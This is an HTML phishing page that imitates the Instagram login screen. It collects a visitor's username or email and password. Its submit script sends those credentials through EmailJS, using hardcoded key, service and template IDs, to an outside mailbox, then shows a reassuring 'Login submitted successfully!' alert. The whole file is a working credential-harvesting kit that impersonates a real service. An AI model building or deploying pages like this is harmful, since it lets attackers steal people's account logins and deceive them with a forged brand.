<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("1O-AGODK6zJHu3ALi"); // âœ… Your Public Key
    })();
  </script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 8px;
    }

    .logo {
      font-family: 'Pacifico', cursive;
      font-size: 40px;
      margin-bottom: 30px;
      color: #262626;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }

    .login-btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 10px;
      margin-top: 10px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
    }

    .login-btn:disabled {
      background-color: #b2dffc;
      cursor: not-allowed;
    }

    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
      text-align: center;
      font-size: 13px;
      color: #8e8e8e;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .divider:not(:empty)::before {
      margin-right: 10px;
    }

    .divider:not(:empty)::after {
      margin-left: 10px;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      margin-top: 10px;
      cursor: pointer;
    }

    .forgot {
      color: #00376b;
      font-size: 12px;
      margin-top: 15px;
      cursor: pointer;
      display: block;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">Instagram</div>
    <form id="login-form">
      <input type="text" name="user_email" placeholder="Phone number, username, or email" required>
      <input type="password" name="user_password" placeholder="Password" required>
      <button type="submit" class="login-btn">Log In</button>
    </form>

    <div class="divider">OR</div>

    <div class="fb-login">Log in with Facebook</div>
    <a href="#" class="forgot">Forgot password?</a>
  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault();

      emailjs.sendForm('service_i8f35pe', 'template_is726ki', this)
        .then(function() {
          alert("Login submitted successfully!");
          document.getElementById("login-form").reset();
        }, function(error) {
          alert("Something went wrong. Try again.");
          console.error("FAILED...", error);
        });
    });
  </script>
</body>
</html>
